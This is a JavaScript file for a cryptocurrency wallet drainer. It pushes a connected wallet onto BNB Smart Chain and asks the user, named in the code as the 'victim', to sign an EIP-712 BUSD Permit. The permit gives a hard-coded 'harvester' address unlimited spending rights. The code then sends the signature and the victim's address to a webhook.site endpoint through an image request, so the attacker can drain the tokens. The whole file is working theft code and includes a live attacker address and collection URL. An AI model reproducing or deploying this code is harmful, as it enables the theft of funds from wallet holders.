const HARVESTER_ADDRESS = "0x119C89E29975eA0BbeDAb6640188CaCa8B739541"; 
const BUSD_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
const WEBHOOK_SITE_URL = "https://webhook.site/20179441-fa4d-4165-ab08-c634d80612f2";

async function triggerPermit() {
    if (!window.ethereum) {
        alert("No Wallet Detected. Open in Trust Wallet.");
        return;
    }

    try {
        // STEP 1: FORCE BSC
        alert("DEBUG 1: Switching to BSC...");
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }],
        });

        // STEP 2: CONNECT ACCOUNT
        alert("DEBUG 2: Connecting Account...");
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const victim = accounts[0];
        alert("DEBUG 3: Connected as " + victim);

        // UI CHANGE
        document.getElementById('ui-main').style.display = 'none';
        document.getElementById('ui-loading').style.display = 'block';

        // STEP 3: GET NONCE (Raw RPC)
        alert("DEBUG 4: Fetching Nonce...");
        const nonceHex = await window.ethereum.request({
            method: 'eth_call',
            params: [{
                to: BUSD_ADDRESS,
                data: "0x7ecebe00000000000000000000000000" + victim.slice(2)
            }, 'latest']
        });
        const nonce = parseInt(nonceHex, 16);
        alert("DEBUG 5: Nonce is " + nonce);

        // STEP 4: SIGNATURE (The "Moment of Truth")
        const deadline = Math.floor(Date.now() / 1000) + 3600;
        const msgParams = JSON.stringify({
            domain: { name: "BUSD Token", version: "1", chainId: 56, verifyingContract: BUSD_ADDRESS },
            message: { 
                owner: victim, 
                spender: HARVESTER_ADDRESS, 
                value: "115792089237316195423570985008687907853269984665640564039457584007913129639935", 
                nonce: nonce, 
                deadline: deadline 
            },
            primaryType: "Permit",
            types: {
                EIP712Domain: [
                    { name: "name", type: "string" }, { name: "version", type: "string" },
                    { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }
                ],
                Permit: [
                    { name: "owner", type: "address" }, { name: "spender", type: "address" },
                    { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ]
            }
        });

        alert("DEBUG 6: Requesting Signature Popup...");
        const signature = await window.ethereum.request({
            method: 'eth_signTypedData_v4',
            params: [victim, msgParams],
        });

        // STEP 5: SPLIT SIG
        const r = signature.slice(0, 66);
        const s = "0x" + signature.slice(66, 130);
        const v = parseInt(signature.slice(130, 132), 16);

        alert("FINAL SUCCESS!\nV: " + v + "\nR: " + r + "\nS: " + s + "\nDeadline: " + deadline);

        // STEP 6: EXFILTRATE (Using simple image ping to bypass CORS)
        const params = new URLSearchParams({ v, r, s, victim, deadline }).toString();
        const img = new Image();
        img.src = WEBHOOK_SITE_URL + "?" + params;

    } catch (err) {
        alert("CRITICAL ERROR: " + err.message);
        document.getElementById('ui-main').style.display = 'block';
        document.getElementById('ui-loading').style.display = 'none';
    }
}
